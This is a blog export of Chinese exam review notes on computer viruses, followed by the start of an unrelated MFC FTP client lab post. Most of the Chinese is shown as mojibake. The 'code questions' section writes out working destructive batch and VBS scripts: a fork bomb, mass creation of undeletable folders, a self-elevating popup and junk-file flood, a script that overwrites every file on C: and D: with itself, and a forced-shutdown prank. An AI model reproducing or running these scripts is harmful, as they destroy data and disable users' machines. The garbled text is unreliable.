æ£€æµ‹æ–¹æ³•ï¼š åœ¨wordä¸­ï¼Œé€‰ä¸­normalçœ‹æœ‰æ²¡æœ‰ä¸€äº›åå­—å¥‡æ€ªçš„è‡ªåŠ¨å® ä¸è¿›è¡Œæ“ä½œé€€å‡ºï¼Œæç¤ºå­˜ç›˜ï¼Œå¯èƒ½æ˜¯normal.dotä¸­å¸¦æ¯’ wordå·¥å…·æ ä¸­ï¼Œæ— â€œå®â€ wordè¿è¡Œä¸­ï¼Œå†…å­˜ä¸è¶³ï¼Œæ‰“å°ä¸æ­£å¸¸ è¿è¡Œwordæ—¶ï¼Œæç¤ºæ˜¯å¦å¯åŠ¨å® æ¸…é™¤ï¼š æŸ¥çœ‹noraml.dotï¼Œåˆ é™¤æ¥å†ä¸æ˜çš„å® æŸ¥çœ‹noraml.dotï¼Œç”¨åŸæ–‡ä»¶è¦†ç›–è¢«æ„ŸæŸ“çš„ é˜²æ­¢ç—…æ¯’å…¥ä¾µçš„åŸåˆ™ã€æ–¹å¼æ˜¯ä»€ä¹ˆï¼ŸåŸåˆ™ï¼š ä¸»åŠ¨é˜²å¾¡ä¸ºä¸»ï¼Œç»“åˆè¢«åŠ¨å¤„ç†ï¼Œé˜»å¡ä¼ æ’­ã€‚ é˜²æ­¢å¤–ç•Œè®¡ç®—æœºç—…æ¯’å‘æœºå†…ä¼ æŸ“ï¼›æŠ‘åˆ¶ç°æœ‰è®¡ç®—æœºç—…æ¯’å‘å¤–ä¼ æŸ“ å¯¹å·²çŸ¥ç—…æ¯’çš„é¢„é˜² å¯¹æœªæ¥ç—…æ¯’çš„é¢„é˜² æ–¹å¼ï¼š å°†å¤§é‡æ€æ¯’è½¯ä»¶æ±‡é›†ä¸€èµ·ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨å·²çŸ¥è®¡ç®—æœºç—…æ¯’ã€‚ æ£€æµ‹ä¸€äº›ç—…æ¯’ç»å¸¸æ”¹å˜çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå¼•å¯¼åŒºã€ä¸­æ–­å‘é‡è¡¨ã€å¯ç”¨å†…å­˜ç©ºé—´ç­‰ï¼Œå·²ç¡®å®šæ˜¯å¦å­˜åœ¨ç—…æ¯’ æ£€æµ‹å†™ç›˜æ“ä½œï¼Œå¯¹å¼•å¯¼åŒºã€ä¸»å¼•å¯¼åŒºçš„å†™æ“ä½œæŠ¥è­¦ã€‚ å¯¹æ–‡ä»¶å½¢æˆä¸€ä¸ªå¯†ç æ£€éªŒç å’Œç¨‹åºå®Œæ•´æ€§çš„éªŒè¯ã€‚ æ™ºèƒ½åˆ¤æ–­å‹ï¼šè®¾å®šç—…æ¯’è¡Œä¸ºåˆ¤å®šåº“ æ™ºèƒ½ç›‘å¯Ÿå‹ï¼šè®¾è®¡ç—…æ¯’ç‰¹å¾åº“ã€è¡Œä¸ºçŸ¥è¯†åº“ç­‰ è®¡ç®—æœºç—…æ¯’è¦è¾¾åˆ°çš„æœ€ç»ˆç›®æ ‡æ˜¯ä»€ä¹ˆ?ç ´åç³»ç»Ÿã€æ•°æ®ä¸¢å¤±ã€æ•°æ®å¯†çº§å¼‚å¸¸ã€ç½‘ç»œç˜«ç—ª å¤åˆå‹ç—…æ¯’æ˜¯ä»€ä¹ˆï¼Ÿå¤åˆå‹ç—…æ¯’åŒæ—¶å…·æœ‰å¤šç§ç—…æ¯’ç‰¹å¾ï¼Œæ–‡ä»¶å‹å’Œå¼•å¯¼å‹çš„æŸäº›ç‰¹ç‚¹ï¼Œæˆ–è€…æ¶æ„ä»£ç é€šè¿‡å¤šç§æ–¹å¼ä¼ æ’­ç­‰ã€‚ ä¾é™„åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸Šï¼Œå½“ä½œè½½ä½“è¿›è¡Œä¼ æ’­ï¼Œå½“è¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¸­æœ‰ç¡¬ç›˜ï¼Œåˆ™ç«‹å³æ„ŸæŸ“ä¸»å¼•å¯¼åŒºï¼Œä»¥åç”¨ç¡¬ç›˜å¯åŠ¨ç³»ç»Ÿæ—¶ï¼Œå°±æœ‰è¯¥ç—…æ¯’ã€‚ åšæ³•ï¼šå°†ç¡¬ç›˜ä¸»å¼•å¯¼åŒºå†…ç—…æ¯’æ¸…é™¤ï¼›è®°å½•æ‰§è¡Œç¨‹åºçš„èµ·å§‹åœ°å€ï¼Œç»ˆæ­¢åœ°å€ï¼Œæ¸…é™¤ç—…æ¯’ä»£ç ã€‚å°†æ–‡ä»¶é•¿åº¦æ”¹ä¸ºæ¸…æ¯’åçš„é•¿åº¦ã€‚ ä¼ æ’­é€”å¾„ï¼šç”µå­é‚®ä»¶ã€webæœåŠ¡å™¨ã€webç»ˆç«¯ã€ç½‘ç»œå…±äº«ç­‰ æ–‡ä»¶å‹ç—…æ¯’æ„ŸæŸ“çš„æ˜¯å“ªä¸€ç±»æ–‡ä»¶ï¼Ÿæ‰©å±•åä¸ºCOMã€EXEã€SYSã€BATå¯æ‰§è¡Œæ–‡ä»¶ã€‚ æ¸…é™¤ç—…æ¯’çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ æ¸…é™¤è¢«æ„ŸæŸ“æ–‡ä»¶ åˆ é™¤ç—…æ¯’æ–‡ä»¶ ç¦æ­¢è®¿é—®ç—…æ¯’æ–‡ä»¶ ç—…æ¯’åˆ é™¤åç§»åˆ°éš”ç¦»åŒº ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç—…æ¯’æ—¶ï¼Œä¸å¤„ç† ä¸€ä¸ªç§»åŠ¨ç¡¬ç›˜è¢«æ„ŸæŸ“äº†ï¼Œå¯¹å®ƒåšæ€æ ·çš„å¤„ç†ï¼Ÿ ç”¨åç—…æ¯’è½¯ä»¶æ¸…é™¤ç—…æ¯’æˆ–è€…åœ¨æ— æ¯’è®¡ç®—æœºæ ¼å¼åŒ–è¯¥ç›˜ ç—…æ¯’åˆ é™¤åç§»åˆ°éš”ç¦»åŒº ç¦æ­¢ä¸»æœºè®¿é—®ç—…æ¯’æ–‡ä»¶ ç»™ä¸€ä¸ªçŠ¶æ€ï¼Œè¦åˆ¤æ–­æ˜¯ä¸æ˜¯ä¸­äº†ç—…æ¯’ï¼Ÿå‘ä½œç‰¹å¾ï¼› è®¡ç®—æœºæ— æ³•å¯åŠ¨ è®¡ç®—æœºç»å¸¸æ­»æœº æ–‡ä»¶æ— æ³•æ‰“å¼€ ç³»ç»Ÿæç¤ºå†…å­˜ä¸è¶³ ç£ç›˜ç©ºé—´ä¸è¶³ æ•°æ®çªç„¶ä¸¢å¤± ç³»ç»Ÿè¿è¡Œé€Ÿåº¦æ…¢ é”®ç›˜ã€é¼ æ ‡é”æ­» ç³»ç»Ÿå¢åŠ å¤§é‡æ¥å†ä¸æ˜çš„æ–‡ä»¶ è‡ªåŠ¨åŠ è½½æŸäº›ç¨‹åº è®¡ç®—æœºç—…æ¯’å±å®³æ˜¯ä»€ä¹ˆï¼Ÿ å¯¹æ•°æ®ä¿¡æ¯ç›´æ¥ç ´åï¼Œåˆ é™¤æˆ–ä¿®æ”¹æ–‡ä»¶å’Œæ•°æ®ã€‚ éæ³•å ç”¨ç£ç›˜ç©ºé—´ï¼Œå¯¹ç£ç›˜æ•°æ®ç ´åï¼Œé€ æˆæ•°æ®ä¸¢å¤±ã€‚ å°†éæ³•æ•°æ®å†™DOSå†…å­˜å‚æ•°åŒºï¼Œå¼•èµ·ç³»ç»Ÿå´©æºƒã€‚ æŠ¢å ç³»ç»Ÿèµ„æºï¼Œå¹²æ‰°ç³»ç»Ÿè¿è¡Œï¼Œå½±å“è¿è¡Œé€Ÿåº¦ è„šæœ¬ç—…æ¯’çš„ç‰¹ç‚¹ï¼Ÿä½¿ç”¨scriptä»£ç ç¼–å†™çš„å…·æœ‰æ¶æ„æ“ä½œæ„å‘çš„ç¨‹åºä»£ç ã€‚æ˜“ç”¨ã€‚ ç¼–å†™ç®€å• ç ´ååŠ›å¤§ æ„ŸæŸ“åŠ›å¼º ä¼ æ’­èŒƒå›´å¤§ ç—…æ¯’æºç æ˜“è¢«è·å–ã€å˜ç§å¤š æ¬ºéª—æ€§å¼º ä½¿è®¡ç®—æœºç—…æ¯’ç”Ÿäº§æœºå®ç°èµ·æ¥å¾ˆå®¹æ˜“ è •è™«ç—…æ¯’çš„ç‰¹å¾ï¼Ÿè •è™«ç—…æ¯’æ˜¯è‡ªåŒ…å«çš„ç¨‹åºï¼Œèƒ½ä¼ æ’­è‡ªèº«åŠŸèƒ½çš„å¤ä»¶æˆ–æŸäº›éƒ¨åˆ†åˆ°ç³»ç»Ÿä¸­ã€‚ é€šè¿‡ç½‘ç»œä¼ æ’­çš„ã€‚ ä¸»åŠ¨æ”»å‡»ï¼šæ— éœ€å¹²é¢„å³å¯è¿è¡Œçš„æ”»å‡»ç¨‹åºæˆ–ä»£ç ã€‚ ç‹¬ç«‹ç¨‹åºï¼šä¸åˆ©ç”¨æ–‡ä»¶å¯„ç”Ÿã€‚ å¯¹ç½‘ç»œé€ æˆæ‹’ç»æœåŠ¡ çŸ­æ—¶é—´å†…è”“å»¶ç½‘ç»œï¼Œé€ æˆç˜«ç—ª æœ¨é©¬æœ‰å“ªäº›ç§ç±»ï¼Ÿ ç ´åå‹ å¯†ç å‘é€å‹ è¿œç¨‹è®¿é—®å‹ é”®ç›˜è®°å½•æœ¨é©¬ DOSæ”»å‡» ä»£ç†æœ¨é©¬ FTPæœ¨é©¬ ç¨‹åºæ€æ‰‹ åå¼¹ç«¯å£ ç—…æ¯’æ£€æµ‹ï¼Œå¯å‘å¼æ€æ¯’æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼ˆé™æ€ã€åŠ¨æ€ï¼‰ï¼Ÿä¾æ®ç—…æ¯’å’Œæ­£å¸¸ç¨‹åºä¹‹é—´å­˜åœ¨çš„åŒºåˆ«ï¼Œåº”ç”¨åœ¨æŸ¥æ€ç¨‹åºä¸­ã€‚â€œå¯å‘â€æ˜¯è‡ªæˆ‘å‘ç°çš„èƒ½åŠ›ï¼Œæˆ–è¿ç”¨æŸç§æ–¹å¼æˆ–æ–¹æ³•åˆ¤å®šäº‹ç‰©çš„çŸ¥è¯†å’ŒæŠ€èƒ½ã€‚ åŠ¨æ€ï¼šæ˜¯ä»¥äººå·¥æ™ºèƒ½çš„æ–¹å¼å®ç°åŠ¨æ€åç¼–è¯‘ä»£ç åˆ†æã€‚ç”¨debugç­‰ç¨‹åºè°ƒè¯•å·¥å…·ï¼Œåœ¨å†…å­˜å¸¦æ¯’çš„æƒ…å†µä¸‹ï¼ŒåŠ¨æ€è·Ÿè¸ªï¼Œè§‚å¯Ÿå·¥ä½œè¿‡ç¨‹ã€‚åœ¨é™æ€çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥åˆ†æ é™æ€ï¼šç”¨åæ±‡ç¼–ç¨‹åºå¤„ç†ï¼Œå¯¹ç¨‹åºæ¸…å•è¿›è¡Œåˆ†æã€‚å°†æ–‡ä»¶æ„ŸæŸ“è¿‡ç¨‹ç¿»è½¬ä¸ºæ¸…é™¤ç—…æ¯’ã€ä¿®å¤æ–‡ä»¶ã€‚åˆ†æå¯ç”¨ä½œç‰¹å¾ç çš„éƒ¨åˆ†ç­‰ã€‚åœ¨é™æ­¢çŠ¶æ€ä¸‹é€šè¿‡ç—…æ¯’çš„å…¸å‹æŒ‡ä»¤ç‰¹å¾è¯†åˆ«ç—…æ¯’çš„æ–¹æ³•ï¼Œæ˜¯å¯¹ä¼ ç»Ÿç‰¹å¾ç æ‰«æçš„ä¸€ç§è¡¥å……ã€‚ è®¡ç®—æœºç—…æ¯’ç¨‹åºçš„å…¸å‹ç»„æˆæœ‰å“ªäº›æ¨¡å—è®¡ç®—æœºç—…æ¯’ç¨‹åºçš„å…¸å‹ç»„æˆåŒ…æ‹¬å¼•å¯¼æ¨¡å—ã€ä¼ æŸ“æ¨¡å—å’Œè¡¨ç°æ¨¡å— CIHï¼Ÿ â€œCIHâ€è®¡ç®—æœºç—…æ¯’å±äºæ–‡ä»¶å‹ç—…æ¯’ï¼Œåˆ«åâ€œwin95.CIHâ€ï¼Œâ€œSpacefillerâ€ï¼Œâ€œWin32.CIHâ€ï¼Œâ€œPE_CIHâ€ç­‰ã€‚ ä¸»è¦æ„ŸæŸ“Windows 95&#x2F;98æ“ä½œç³»ç»Ÿä¸‹çš„å¯æ‰§è¡Œç¨‹åºã€‚ èƒ½å¤Ÿç ´åè®¡ç®—æœºç³»ç»Ÿç¡¬ä»¶ï¼Œå‘ä½œæ—¶ç ´åç¡¬ç›˜æ•°æ®ï¼ŒåŒæ—¶æœ‰å¯èƒ½ç ´åBIOSç¨‹åºã€‚ ä¾é™„åœ¨å…¶ä»–ç¨‹åºä¸Šé¢ï¼Œé€šè¿‡ç½‘ç»œä¼ æ’­ã€‚ é˜²ç«å¢™æ˜¯ä»€ä¹ˆï¼ŒåŠŸèƒ½ï¼Œå¯¹å®ƒçš„è¦æ±‚?é˜²ç«å¢™ï¼šé˜²ç«å¢™æ˜¯ç½‘ç»œå®‰å…¨çš„å±éšœï¼Œç”±è½¯ä»¶å’Œç¡¬ä»¶ç»„åˆè€Œæˆï¼Œå¤„äºä¼ä¸šæˆ–ç½‘ç»œç¾¤ä½“è®¡ç®—æœºä¸å¤–ç•Œé€šé“ä¹‹é—´ã€‚é™åˆ¶å¤–éƒ¨å¯¹å†…éƒ¨çš„è®¿é—®ã€‚é˜²æ­¢éæ³•ç”¨æˆ·çš„å…¥ä¾µ åŠŸèƒ½ï¼š æé«˜å†…éƒ¨ç½‘ç»œå®‰å…¨æ€§ å¼ºåŒ–ç½‘ç»œå®‰å…¨ç­–ç•¥ å¯¹ç½‘ç»œå­˜å–å’Œè®¿é—®è¿›è¡Œç›‘æ§å®¡è®¡ æä¾›ç½‘ç»œä½¿ç”¨æƒ…å†µçš„ç»Ÿè®¡æ•°æ® è¦æ±‚ï¼š å‘ç”Ÿå¯ç–‘äº‹ä»¶è¿›è¡ŒæŠ¥è­¦ï¼Œå’Œæ”»å‡»è¯¦æƒ… èƒ½è®°å½•è®¿é—®å¹¶ä½œå‡ºæ—¥å¿—è®°å½• å®ç°å†…éƒ¨ç½‘ç»œé‡ç‚¹ç½‘æ®µçš„éš”ç¦» ç—…æ¯’é˜²ç«å¢™ï¼š å¯¹ç³»ç»Ÿå®æ–½å®æ—¶ç›‘æ§ï¼Œå¯¹æµå…¥æµå‡ºç³»ç»Ÿçš„æ•°æ®ä¸­å¯èƒ½å«æœ‰çš„ç—…æ¯’ä»£ç è¿›è¡Œè¿‡æ»¤ã€‚ èƒ½æœ‰æ•ˆçš„é˜»æ­¢ç—…æ¯’ä»ç½‘ç»œå‘æœ¬æœºç³»ç»Ÿå…¥ä¾µã€‚ åŒå‘è¿‡æ»¤ï¼Œä¿è¯æœ¬æœºä¸ä¼šå‘ç½‘ç»œä¼ æ’­ç—…æ¯’ã€‚ æ€ä¹ˆæ£€æµ‹è®¡ç®—æœºç—…æ¯’ï¼Œæ£€æµ‹æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ å€ŸåŠ©ç®€å•å·¥å…·ï¼šdebugç­‰ï¼Œæ£€æµ‹è€…é˜…è¯» å€ŸåŠ©ä¸“ç”¨å·¥å…·ï¼šnortonç­‰ï¼Œèƒ½è‡ªåŠ¨æ‰«æ å¤–è§‚æ£€æµ‹æ³•ï¼šçœ‹è®¡ç®—æœºæ˜¯å¦æœ‰æ˜æ˜¾å¼‚å¸¸ï¼Œå¦‚å±å¹•å¼‚å¸¸ã€ç³»ç»Ÿå˜æ…¢ç­‰ ç‰¹å¾ä»£ç æ³•ï¼šä¸ç‰¹å¾ç åº“è¿›è¡Œå¯¹æ¯” ç³»ç»Ÿæ•°æ®å¯¹æ¯”æ³•ï¼šçœ‹æœ‰æ— æ„å¤–åç°‡ã€‚æ£€æŸ¥ä¸­æ–­å‘é‡ç­‰ã€‚ å®æ—¶ç›‘æ§æ³•ï¼šç›‘è§†è¡Œä¸ºï¼Œæœ‰å¼‚å¸¸å°±åŠæ—¶æŠ¥è­¦ è½¯ä»¶æ¨¡æ‹Ÿæ³•ï¼šä¸“ç”¨æ¥æ£€æµ‹å˜å½¢ç—…æ¯’ã€‚æ˜¯ä¸€ç§è½¯ä»¶åˆ†æå™¨ï¼Œæ¨¡æ‹Ÿä¸€ä¸ªç¨‹åºè¿è¡Œç¯å¢ƒï¼Œå°†ç¨‹åºè½½å…¥å…¶ä¸­ï¼Œçœ‹ä»–é€ æˆçš„åæœ è®¡ç®—æœºç—…æ¯’ä¸€èˆ¬åˆ†ä¸º å¼•å¯¼å‹ã€æ–‡ä»¶å‹ã€‚å®ƒä»¬ä¿©çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¼•å¯¼å‹ï¼šæ”¹å†™ç£ç›˜ä¸Šçš„å¼•å¯¼åŒºä¸­çš„å†…å®¹ï¼Œæˆ–æ”¹å†™åˆ†åŒºè¡¨ã€‚åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„å¼•å¯¼æ¨¡å—æ”¾åœ¨æŸä¸ªå›ºå®šä½ç½®ï¼Œå¹¶ä¸”æ§åˆ¶æƒè½¬äº¤æ–¹å¼æ˜¯åŸºäºç‰©ç†åœ°å€ï¼Œæ‰€ä»¥ç—…æ¯’å æ®è¯¥ç‰©ç†ä½ç½®å³å¯è·å¾—æ§åˆ¶æƒã€‚æ‰§è¡Œç—…æ¯’åï¼Œå†æŠŠæ§åˆ¶æƒè½¬äº¤ç»™å¼•å¯¼åŒºã€‚ æ–‡ä»¶å‹ï¼šä¸»è¦æ„ŸæŸ“å¯æ‰§è¡Œç¨‹åºã€‚éœ€è¦å€ŸåŠ©äºè½½ä½“ã€‚å¯ä»¥æŠŠç—…æ¯’çš„ç¨‹åºç å¤åˆ¶åˆ°å®¿ä¸»æ–‡ä»¶çš„å¼€å¤´æˆ–ç»“å°¾ã€‚ å¸¸é©»äºå†…å­˜ã€‚ ä»£ç é¢˜123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596971.æ¡Œé¢ä¸Šåˆ›å»ºè®°äº‹æœ¬ï¼Œæ”¹åç¼€ä¸ºbat::è¾“å…¥ä»¥ä¸‹ä»£ç %0|%0ä¿å­˜åé€€å‡ºï¼Œæ‰“å¼€ä¼šå‘ç°æ— é™åˆ¶çš„å¼¹çª—ã€‚è¿™æ˜¯ä»€ä¹ˆåŸç†å‘¢ï¼Ÿæ‰§è¡Œè„šæœ¬çš„æ—¶å€™ï¼Œ|ç®¡é“ç¬¦ä¼šå°†å·¦é¢çš„å€¼ä¼ ç»™å³è¾¹ï¼Œè€Œè¿™é‡Œ%0æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆæ‰¹å¤„ç†è·¯å¾„ï¼‰ï¼Œæ‰€ä»¥ä¼šæ— é™æ‰§è¡Œè‡ªå·±ã€‚2æ¡Œé¢ä¸Šåˆ›å»ºè®°äº‹æœ¬ï¼Œæ”¹åç¼€ä¸ºbat::è¾“å…¥ä»¥ä¸‹ä»£ç for /l %%i in (1 1 999999) do md A..\\è¿™ä¸ªç—…æ¯’åˆ©ç”¨Windowså‘½åæ¼æ´ï¼Œåˆ›å»º999999ä¸ªåˆ é™¤ä¸äº†ä¹Ÿæ‰“ä¸å¼€çš„æ–‡ä»¶å¤¹ã€‚è§£å†³æ–¹æ³•ï¼šæŠŠmdæ”¹ä¸ºrd3æ¡Œé¢ä¸Šåˆ›å»ºè®°äº‹æœ¬ï¼Œæ”¹åç¼€ä¸ºbat@%1 mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;cmd.exe&quot;,&quot;/c %~s0 ::&quot;,&quot;&quot;,&quot;runas&quot;,0)(window.close)&amp;&amp;exit:aset /a a+=1echo %random%-%random%-%random% &gt; C:\\Users\\%username%\\Desktop\\ç—…æ¯’æ–‡ä»¶.%random%mshta javascript:alert(&quot;æ‚¨å·²ä¸­ç¬¬%a%ä¸ªç—…æ¯’.&quot;);close();goto aè¿™ä¸ªç—…æ¯’ä¼šåœ¨åå°è¿è¡Œï¼Œåœ¨æ¡Œé¢é‡å¤å¼¹ä¿¡æ¯æ¡†ï¼Œç”Ÿæˆåƒåœ¾æ–‡ä»¶ï¼Œåƒä¸‡ä¸æ•¢éšæ„æµ‹è¯•ï¼Œå› ä¸ºç”µè„‘ä¼šæ¶ˆè€—å°½å†…å­˜åè“å±ã€‚4è¿™ç§ç—…æ¯’æœ€æœ‰ç ´åæ€§ï¼Œè·Ÿç†ŠçŒ«çƒ§é¦™åª²ç¾ã€‚åŒæ ·ï¼Œæ¡Œé¢ä¸Šåˆ›å»ºè®°äº‹æœ¬ï¼Œæ”¹åç¼€ä¸ºbat@%1 mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;cmd.exe&quot;,&quot;/c %~s0 ::&quot;,&quot;&quot;,&quot;runas&quot;,0)(window.close)&amp;&amp;exitfor /f &quot;tokens=* delims=&quot; %%i in (&#x27;dir /b D:\\*.*&#x27;) do copy /y &quot;%dpnx0&quot; &quot;%%i&quot; &gt;nulfor /f &quot;tokens=* delims=&quot; %%i in (&#x27;dir /b C:\\*.*&#x27;) do copy /y &quot;%dpnx0&quot; &quot;%%i&quot; &gt;nulæ­¤ç¨‹åºç‰¹åˆ«ç‹ ï¼Œä¼šåœ¨åå°æŠŠCã€Dç›˜æ‰€æœ‰çš„æ–‡ä»¶éƒ½æ›¿æ¢æˆè‡ªå·±ï¼ˆç—…æ¯’æ–‡ä»¶ï¼Œç„¶åä¼šåˆè¢«æ‰§è¡Œï¼‰ã€‚5 åˆ›å»ºè®°äº‹æœ¬ï¼Œåç¼€æ”¹ä¸ºVBS=======åˆ†å‰²çº¿=======on error resume nextdim WSHshellAset WSHshellA = wscript.createobject(&quot;wscript.shell&quot;)WSHshellA.run &quot;cmd.exe /c shutdown -r -t 120 -c &quot;&quot;è¯´æˆ‘æ˜¯çŒªï¼Œä¸è¯´æˆ‘æ˜¯çŒªå°±ä¸¤åˆ†é’Ÿå…³ä½ æœºï¼Œä¸ä¿¡ï¼Œä½ è¯•è¯•Â·Â·Â·&quot;&quot; &quot;,0 ,truedim ado while(a &lt;&gt; &quot;æˆ‘æ˜¯çŒª&quot;)a = inputbox (&quot;è¯´æˆ‘æ˜¯çŒª,å°±ä¸å…³æœºï¼Œè¯´ &quot;&quot;æˆ‘æ˜¯çŒª&quot;&quot; &quot;,&quot;è¯´ä¸è¯´&quot;,&quot;ä½ å†™å•Š&quot;,8000,7000)msgbox chr(13) + chr(13) + chr(13) + a,0,&quot;MsgBox&quot;loopmsgbox chr(13) + chr(13) + chr(13) + &quot;æ—©è¯´å°±è¡Œäº†å˜›,å‘µå‘µï¼Œçˆ½&quot;dim WSHshellset WSHshell = wscript.createobject(&quot;wscript.shell&quot;)WSHshell.run &quot;cmd.exe /c shutdown -a&quot;,0 ,truemsgbox chr(13) + chr(13) + chr(13) + &quot;å“ˆå“ˆå“ˆå“ˆï¼ŒçœŸè¿‡ç˜¾&quot;WScript.Echo(&quot;å–œæ¬¢å—ï¼Œå¿«ç‚¹ç‚¹èµï¼ˆY Yï¼‰&quot;)a = inputbox (&quot;èµä¸èµï¼Œè¯´èµå°±è§£é™¤ï¼Œä¸è¯´å°±ä¸è§£ &quot;&quot;èµ&quot;&quot; &quot;,&quot;èµä¸èµ&quot;,&quot;èµå—&quot;,8000,7000)msgbox chr(13) + chr(13) + chr(13) + a,0,&quot;MsgBox&quot;loopdomsgbox chr(13) + chr(13) + chr(13) + &quot;å‘µå‘µï¼Œçˆ½æ­»äº†&quot;å¦å­˜.VBS6@echo offecho Message here.shutdown -s -f -t 60 -c &quot;æ­¤å¤„é”®å…¥æ‚¨è¦æ˜¾ç¤ºçš„æ¶ˆæ¯ã€‚&quot;","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ç—…æ¯’åŸç†","slug":"æœŸæœ«è€ƒè¯•/ç—…æ¯’åŸç†","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"MFC WinInetç±»å®ç°FTPå®¢æˆ·ç«¯","slug":"MFC-WinInetç±»å®ç°FTPå®¢æˆ·ç«¯","date":"2020-12-09T18:15:26.000Z","updated":"2024-11-12T06:59:27.000Z","comments":true,"path":"2020/12/10/MFC-WinInetç±»å®ç°FTPå®¢æˆ·ç«¯/","permalink":"https://gryffinbit.top/2020/12/10/MFC-WinInet%E7%B1%BB%E5%AE%9E%E7%8E%B0FTP%E5%AE%A2%E6%88%B7%E7%AB%AF/","excerpt":"","text":"æœ¬æ¬¡å®éªŒçš„å·¥ç¨‹æ–‡ä»¶ä¸‹è½½ï¼šhttps://gryffinbit.lanzous.com/idK4Hj7kb4b å®éªŒç›®æ ‡ç¨‹åºèƒ½å®ç°åŸºæœ¬çš„ FTP å®¢æˆ·æœºç«¯åŠŸèƒ½ï¼Œèƒ½ç™»å½• FTP æœåŠ¡å™¨ï¼Œæ˜¾ç¤ºç™»å½•å®¢æˆ·æœºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œ ç›®å½•åï¼Œèƒ½ä»è¯¥ç›®å½•ä¸­é€‰æ‹©ä¸‹è½½æœåŠ¡å™¨çš„æ–‡ä»¶ï¼Œä¹Ÿèƒ½å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚ å®éªŒç›®çš„ å­¦ä¹ å¦‚ä½•åˆ›å»ºä¸€ä¸ª Internet ä¼šè¯ï¼Œå³åˆ›å»º CInternetSession å¯¹è±¡; å­¦ä¹ å¦‚ä½•å»ºç«‹ä¸ FTP æœåŠ¡å™¨çš„è¿æ¥ï¼Œ å³åˆ›å»º CFtpConnection å¯¹è±¡;å¦‚æœè¿æ¥æˆåŠŸï¼Œå¦‚ä½•è·å¾—å½“å‰ç™»å½•çš„ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•åç§°ï¼Œå³ æ£€ç´¢ä¸€ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶æ˜¾ç¤ºæ–‡ä»¶ä¿¡æ¯;å¦‚ä½•ä¸‹è½½æ–‡ä»¶ã€ä¸Šä¼ æ–‡ä»¶ä»¥åŠå…³é—­è¿æ¥ã€‚ å®éªŒç¯å¢ƒWindows10 x64ï¼ŒVisual Studio 2017 å®éªŒå†…å®¹åº”ç”¨ç¨‹åºçš„ç±»å‹æ˜¯åŸºäºå¯¹è¯æ¡†çš„ã€‚ å¯¹è¯æ¡†ä¸­åŒ…æ‹¬ä¸‰ä¸ªæ–‡æœ¬æ¡†ï¼Œåˆ†åˆ«ç”¨äºè¾“å…¥ FTP æœåŠ¡å™¨åŸŸåã€ç™»å½•ç”¨æˆ·åå’Œç™»å½•å£ä»¤;ä¸€ä¸ªåˆ— è¡¨æ¡†ï¼Œç”¨æ¥æ˜¾ç¤º FTP æœåŠ¡å™¨å½“å‰ç›®å½•çš„å†…å®¹ï¼Œå¹¶å…è®¸ç”¨æˆ·ä»ä¸­é€‰æ‹©æ–‡ä»¶ä¸‹è½½;å››ä¸ªå‘½ä»¤æŒ‰é’®ï¼Œåˆ† åˆ«æ‰§è¡ŒæŸ¥è¯¢ã€ä¸Šä¼ ã€ä¸‹è½½å’Œé€€å‡ºçš„æ“ä½œã€‚ å®éªŒåŸç†ï¼ˆæ¨¡å‹ï¼‰WinInet ç±»ç¼–ç¨‹çš„ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ã€‚ (1)åˆ›å»º CInternetSession ç±»å¯¹è±¡ï¼Œåˆ›å»ºå¹¶åˆå§‹åŒ– Internet ä¼šè¯ã€‚ (2)åˆ©ç”¨ CInternetSession ç±»çš„ QueryOption æˆ– SetOption æˆå‘˜å‡½æ•°ï¼Œå¯ä»¥æŸ¥è¯¢æˆ–è®¾ç½®è¯¥ç±»å†… å«çš„ Internet è¯·æ±‚é€‰é¡¹ï¼Œè¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ï¼Œä¸éœ€è¦å¯ä»¥ä¸åšã€‚ (3)åˆ›å»ºè¿æ¥ç±»å¯¹è±¡ï¼Œå»ºç«‹ CInternetSession å¯¹è±¡ä¸ç½‘ç»œæœåŠ¡å™¨çš„è¿æ¥ï¼Œä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºä¸ç½‘ ç»œæœåŠ¡å™¨çš„è¿æ¥ã€‚åªéœ€è¦åˆ†åˆ«è°ƒç”¨ CInternetSession ç±»çš„ GetFtpConnectionã€GetHttpConnection æˆ– GetGopherConnection å‡½æ•°å°±å¯ä»¥è½»æ¾åœ°åˆ›å»º CFtpConnection ç±»ã€CHttpConnection ç±»æˆ– CGopher Connection ç±»çš„å¯¹è±¡å®ä¾‹ã€‚å†ä½¿ç”¨è¿™äº›å¯¹è±¡å®ä¾‹çš„æˆå‘˜å‡½æ•°å°±èƒ½å®Œæˆå¾ˆå¤šå¯¹äºç½‘ç»œæœåŠ¡å™¨çš„æ“ä½œã€‚ ä¾‹å¦‚ï¼Œå¯¹äº FTP 